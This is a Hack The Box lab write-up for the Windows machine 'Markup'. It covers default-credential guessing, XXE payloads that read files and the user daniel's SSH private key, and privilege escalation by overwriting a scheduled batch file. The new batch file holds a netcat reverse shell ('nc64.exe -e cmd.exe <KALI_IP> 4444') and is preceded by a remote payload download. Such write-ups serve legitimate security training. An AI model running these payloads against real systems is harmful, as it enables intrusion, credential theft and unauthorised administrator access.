# Markup (HTB)

> Platform: Hack The Box
> OS: Windows
> Difficulty: Easy
> Result: Administrator

---

## Attack Chain

```text
Reconnaissance
├── nmap -p- -Pn → 22 (OpenSSH for Windows 8.1), 80/443 (Apache 2.4.41 + PHP 7.2.28)
└── whatweb → MegaShopping, PHPSESSID, PHP 7.2.28

Foothold
├── index.php: default creds admin:password → 302 home.php
├── services.php: client-side JS builds XML, POST → process.php
├── process.php: DOMDocument::loadXML() without XXE protection
├── XXE: file:///c:/windows/win.ini (proof of concept)
├── XXE: file:///c:/users/daniel/.ssh/id_rsa → private key
├── ssh -i id_rsa daniel@markup.htb → daniel shell
└── user.txt

Privilege Escalation
├── whoami /groups → BUILTIN\Users
├── icacls C:\Log-Management\job.bat → BUILTIN\Users:(F)
├── wget nc64.exe → C:\Log-Management\nc64.exe
├── overwrite job.bat → nc64.exe -e cmd.exe <KALI_IP> 4444
├── wait for scheduled task → shell as markup\administrator
└── root.txt
```

> [!NOTE]
> All flags, passwords, hashes, and session tokens have been masked for ethical reasons.

---

## Machine Briefing

Windows Server 2019 (1809) hosting a small e-commerce application called MegaShopping, served by Apache 2.4.41 with PHP 7.2.28 and OpenSSH for Windows on port 22. A default credential pair grants access to the ordering page, where the client-side JavaScript submits XML to a backend that parses it with `DOMDocument::loadXML()` without disabling external entities. This XXE flaw allows arbitrary file reads, including the SSH private key of a local user. Once on the box, a log-management batch script with overly permissive ACLs is executed by an Administrator scheduled task - overwriting it yields an Administrator shell.

---

## Reconnaissance

### Port Scan

```bash
sudo nmap -p- --min-rate=5000 --max-retries 1 --defeat-rst-ratelimit -T4 -Pn -n markup.htb
```

```
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https
```

```bash
sudo nmap -sC -sV -Pn -n --open -p 22,80,443 markup.htb
```

```
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH for_Windows_8.1 (protocol 2.0)
| ssh-hostkey:
|   3072 9f:a0:f7:8c:c6:e2:a4:bd:71:87:68:82:3e:5d:b7:9f (RSA)
|   256 90:7d:96:a9:6e:9e:4d:40:94:e7:bb:55:eb:b3:0b:97 (ECDSA)
|_  256 f9:10:eb:76:d4:6d:4f:3e:17:f3:93:d6:0b:8c:4b:81 (ED25519)
80/tcp  open  http     Apache httpd 2.4.41 ((Win64) OpenSSL/1.1.1c PHP/7.2.28)
|_http-server-header: Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.2.28
|_http-title: MegaShopping
443/tcp open  ssl/http Apache httpd 2.4.41 ((Win64) OpenSSL/1.1.1c PHP/7.2.28)
|_http-title: MegaShopping
```

| Port | Service | Version                                  |
|------|---------|------------------------------------------|
| 22   | SSH     | OpenSSH for Windows 8.1                  |
| 80   | HTTP    | Apache 2.4.41 (Win64) PHP 7.2.28         |
| 443  | HTTPS   | Apache 2.4.41 (Win64) PHP 7.2.28         |

The presence of `OpenSSH for_Windows` immediately reveals the underlying platform. The self-signed certificate on 443 is expired (`Not valid before: 2009-11-10`, `Not valid after: 2019-11-08`).

### /etc/hosts

```bash
echo "10.129.19.134 markup.htb" | sudo tee -a /etc/hosts
```

### Web Fingerprinting

```bash
whatweb -a 3 http://markup.htb
```

```
http://markup.htb [200 OK] Apache[2.4.41], Cookies[PHPSESSID], HTML5,
HTTPServer[Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.2.28],
IP[10.129.19.134], OpenSSL[1.1.1c], PHP[7.2.28],
PasswordField[password], PoweredBy[Megacorp],
Title[MegaShopping], X-Powered-By[PHP/7.2.28]
```

The site is a small e-commerce app branded "MegaShopping". The landing page is a login form (`username` / `password`, POST to `index.php`).

---

## Foothold

### Default Credentials

No CVE (custom vulnerability) - the login form accepts the default credential pair `admin:password`.

```bash
for cred in "admin:admin" "administrator:administrator" "admin:administrator" \
            "admin:password" "administrator:password"; do
  u="${cred%%:*}"; p="${cred##*:}"
  code=$(curl -s -o /dev/null -w "%{http_code}" \
    -c /tmp/cj.txt -d "username=$u&password=$p" http://markup.htb/index.php)
  echo "$code  $cred"
done
```

```
200  admin:admin
200  administrator:administrator
200  admin:administrator
302  admin:password
200  administrator:password
```

Only `admin:password` returns 302 - the successful login redirects to `home.php`.

```bash
curl -s -i -c /tmp/cj.txt \
  -d "username=admin&password=password" \
  http://markup.htb/index.php | head -20
```

```
HTTP/1.1 302 Found
Set-Cookie: PHPSESSID=dl2o77jvdmmtr0envgjllaq3a8; path=/
location: home.php
```

The cookie has neither `HttpOnly` nor `Secure` set - a secondary weakness worth noting, though not required for exploitation.

### Application Enumeration

After login, the main navigation contains: `Home`, `About`, `Products`, `Order` (→ `services.php`), `Contact`. The `services.php` page contains an HTML comment:

```html
<!-- Modified by Daniel : UI-Fix-9092-->
```

This leaks a username (`daniel`) - useful later for XXE file paths.

### Order Form - Client-Side XML

The `Order in Bulk` form on `services.php` submits XML generated entirely in JavaScript:

```javascript
function getXml() {
    var elements = document.forms.myForm.elements;
    var xmlTemplate = '<?xml version = "1.0"?><order>';
    for (var i = 0; i < elements.length; i++) {
        var element = elements[i];
        if (element.tagName == "INPUT") {
            xmlTemplate = xmlTemplate + '<' + element.name + '>' +
                          element.value + '</' + element.name + '>';
        }
    }
    var e = document.getElementById("items");
    var item = e.options[e.selectedIndex].value;
    xmlTemplate = xmlTemplate + '<item>' + item + '</item>' +
                  '<address>' + document.getElementById('address').value + '</address></order>';
    var http = new XMLHttpRequest();
    http.open('POST', 'process.php', true);
    http.setRequestHeader('Content-Type', 'text/xml');
    http.send(xmlTemplate);
}
```

The generated XML has the following structure:

```xml
<?xml version = "1.0"?><order><quantity>...</quantity><item>...</item><address>...</address></order>
```

### XXE Discovery

No CVE (custom vulnerability) - XML External Entity (CWE-611) via `DOMDocument::loadXML()` without `libxml_disable_entity_loader(true)`; allows reading arbitrary files.

A POST to `process.php` without a body returns PHP warnings that reveal the parser in use:

```bash
curl -s -b /tmp/cj.txt -X POST http://markup.htb/process.php
```

```
Warning: DOMDocument::loadXML(): Empty string supplied as input
  in C:\xampp\htdocs\process.php on line 11
Warning: simplexml_import_dom(): Invalid Nodetype to import
  in C:\xampp\htdocs\process.php on line 12
Notice: Trying to get property 'quantity' of non-object
  in C:\xampp\htdocs\process.php on line 13
```

This confirms that `process.php` parses XML directly with `DOMDocument::loadXML()` and then reads `->quantity`, `->item`, `->address` via SimpleXML. External entity resolution is left enabled.

Proof of concept - read `C:\windows\win.ini`:

```bash
cat > /tmp/xxe-test.xml <<'EOF'
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///c:/windows/win.ini'>]>
<order><quantity>3</quantity><item>&test;</item><address>x</address></order>
EOF

curl -s -b /tmp/cj.txt -X POST -H "Content-Type: text/xml" \
  --data-binary @/tmp/xxe-test.xml http://markup.htb/process.php
```

```
Your order for ; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1
[Ports]
COM1:=9600,n,8,1
 has been processed
```

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

### SSH Private Key via XXE

The username `daniel` (leaked in the HTML comment) plus Windows conventions give a direct path to the user's OpenSSH key:

```bash
cat > /tmp/xxe-ssh.xml <<'EOF'
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///c:/users/daniel/.ssh/id_rsa'>]>
<order><quantity>3</quantity><item>&test;</item><address>x</address></order>
EOF

curl -s -b /tmp/cj.txt -X POST -H "Content-Type: text/xml" \
  --data-binary @/tmp/xxe-ssh.xml http://markup.htb/process.php
```

```
Your order for -----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
... (truncated) ...
-----END OPENSSH PRIVATE KEY-----
 has been processed
```

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

Save the returned key to `id_rsa` (strip the `Your order for ` prefix and ` has been processed` suffix), then set the correct permissions:

```bash
sed -e 's/^Your order for //' -e 's/ has been processed$//' /tmp/xxe-ssh-out.txt > /tmp/id_rsa
chmod 600 /tmp/id_rsa
ssh-keygen -l -f /tmp/id_rsa
```

```
3072 SHA256:OrvhzyMF1OAj02guQWL1vg2TSovi5XIQONohNGrkRzQ daniel@Entity (RSA)
```

### SSH Login

```bash
ssh -i /tmp/id_rsa -o StrictHostKeyChecking=no daniel@markup.htb
```

```
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

daniel@MARKUP C:\Users\daniel>
```

```cmd
whoami
```

```
markup\daniel
```

```cmd
hostname
```

```
MarkUp
```

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

### User Flag

```cmd
type C:\Users\daniel\Desktop\user.txt
```

```
<USER_FLAG>
```

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

---

## Privilege Escalation

No CVE (custom vulnerability) - incorrect permission assignment (CWE-732): `BUILTIN\Users` has Full Control over `job.bat`, which is executed by an Administrator scheduled task; overwriting the script yields an Administrator shell.

### Local Enumeration

```cmd
whoami /priv
```

```
PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                    State
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

No interesting privileges (`SeImpersonatePrivilege` is absent). `daniel` is a member of `BUILTIN\Users` and the custom group `MARKUP\Web Admins`.

```cmd
whoami /groups
```

```
Group Name                             Type             SID
====================================== ================ ==============================================
Everyone                               Well-known group S-1-1-0
MARKUP\Web Admins                      Alias            S-1-5-21-103432172-3528565615-2854469147-1001
BUILTIN\Remote Management Users        Alias            S-1-5-32-580
BUILTIN\Users                          Alias            S-1-5-32-545
NT AUTHORITY\NETWORK                   Well-known group S-1-5-2
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11
NT AUTHORITY\This Organization         Well-known group S-1-5-15
NT AUTHORITY\Local account             Well-known group S-1-5-113
NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10
Mandatory Label\Medium Mandatory Level Label            S-1-16-8192
```

### Log-Management Script

```cmd
dir C:\
```

```
 Directory of C:\

03/12/2020  03:56 AM    <DIR>          Log-Management
09/15/2018  12:12 AM    <DIR>          PerfLogs
07/28/2021  02:01 AM    <DIR>          Program Files
09/15/2018  12:21 AM    <DIR>          Program Files (x86)
07/28/2021  03:38 AM                 0 Recovery.txt
03/05/2020  05:40 AM    <DIR>          Users
07/28/2021  02:16 AM    <DIR>          Windows
03/05/2020  10:15 AM    <DIR>          xampp
```

The `Log-Management` directory stands out (custom, not a Windows default):

```cmd
dir C:\Log-Management
```

```
 Directory of C:\Log-Management

03/12/2020  03:56 AM    <DIR>          .
03/12/2020  03:56 AM    <DIR>          ..
03/06/2020  02:42 AM               346 job.bat
```

```cmd
type C:\Log-Management\job.bat
```

```bat
@echo off
FOR /F "tokens=1,2*" %%V IN ('bcdedit') DO SET adminTest=%%V
IF (%adminTest%)==(Access) goto noAdmin
for /F "tokens=*" %%G in ('wevtutil.exe el') DO (call :do_clear "%%G")
echo.
echo Event Logs have been cleared!
goto theEnd
:do_clear
wevtutil.exe cl %1
goto :eof
:noAdmin
echo You must run this script as an Administrator!
:theEnd
exit
```

The script calls `wevtutil.exe` (Windows Event Utility) to clear event logs - an operation that requires Administrator rights. The `bcdedit` check at the top is a guard: if the script is not run as Administrator, `bcdedit` returns `Access`, and the script jumps to `noAdmin`.

### Permission Check

```cmd
icacls C:\Log-Management\job.bat
```

```
C:\Log-Management\job.bat BUILTIN\Users:(F)
                          NT AUTHORITY\SYSTEM:(I)(F)
                          BUILTIN\Administrators:(I)(F)
                          BUILTIN\Users:(I)(RX)
```

The first ACE is explicit (not inherited) and grants `BUILTIN\Users` Full Control (`F`) over the script. Since `daniel` is a member of `BUILTIN\Users`, he can overwrite `job.bat`.

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

Combined with the fact that the script is executed periodically by an Administrator scheduled task (the `wevtutil.exe` processes observed by the machine's author, and the whole point of a log-clearing script on a server), this is a straightforward privilege escalation: replace `job.bat` with a reverse-shell launcher and wait.

### Uploading the Payload

On Kali, download a Windows `netcat` binary and serve it over HTTP:

```bash
cd /tmp
wget -q https://github.com/int0x33/nc.exe/raw/master/nc64.exe -O nc64.exe
python3 -m http.server 80
```

On the target, as `daniel`:

```cmd
cd C:\Log-Management
powershell -c "Invoke-WebRequest -Uri http://<KALI_IP>/nc64.exe -OutFile C:\Log-Management\nc64.exe"
dir nc64.exe
```

```
 Directory of C:\Log-Management

10/12/2026  03:02 PM            45,272 nc64.exe
```

### Overwriting job.bat

Start a listener on Kali:

```bash
nc -lvnp 4444
```

Overwrite the script with a reverse-shell launcher. Note: `Set-Content` from PowerShell with `-Encoding ASCII` avoids the UTF-16 BOM that a raw `echo > file` from PowerShell would introduce.

```cmd
powershell -c "Set-Content -Path C:\Log-Management\job.bat -Value 'C:\Log-Management\nc64.exe -e cmd.exe <KALI_IP> 4444' -Encoding ASCII"
type C:\Log-Management\job.bat
```

```
C:\Log-Management\nc64.exe -e cmd.exe <KALI_IP> 4444
```

### Shell as Administrator

Within a few minutes, the scheduled task fires and the overwritten script connects back:

```
connect to [<KALI_IP>] from (UNKNOWN) [10.129.19.134] 49761
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
markup\administrator
```

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

### Root Flag

```cmd
type C:\Users\Administrator\Desktop\root.txt
```

```
<ROOT_FLAG>
```

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

---

## Flags

| Flag | Value          |
|------|----------------|
| User | `<USER_FLAG>`  |
| Root | `<ROOT_FLAG>`  |

---

## Key Takeaways

- **Default credentials are still a foothold.** `admin:password` on a public-facing login is a recurring HTB theme; a small credential list (`admin`, `administrator` × `admin`, `password`, `123456`) is worth trying before anything more complex.
- **Read the source.** The HTML comment `<!-- Modified by Daniel : UI-Fix-9092-->` was the only hint that a user named `daniel` existed; without it, guessing the SSH-key path is pure luck.
- **XXE is a file-read primitive, not just an SSRF gadget.** On Windows, `file:///c:/...` works directly and can exfiltrate keys, credentials, and configuration files. Check the parser in use (`DOMDocument::loadXML()` here) and whether external entities are disabled.
- **PHP warnings leak the backend path.** The `DOMDocument::loadXML(): Empty string supplied as input in C:\xampp\htdocs\process.php on line 11` warning both confirmed the parser and revealed the webroot.
- **ACL-based privilege escalation is common on Windows.** `icacls <file>` is the first check for any custom script outside `C:\Windows`; `BUILTIN\Users:(F)` on a file executed by an elevated process is an immediate win.
- **Use PowerShell `Set-Content -Encoding ASCII` for Windows batch files.** Writing via `echo > file` from PowerShell produces UTF-16 with BOM, which `cmd.exe` mishandles; ASCII keeps the file plain.
- **Scheduled tasks are a reliable trigger.** Once the script is replaced, the exploit is passive - wait for the task and catch the shell.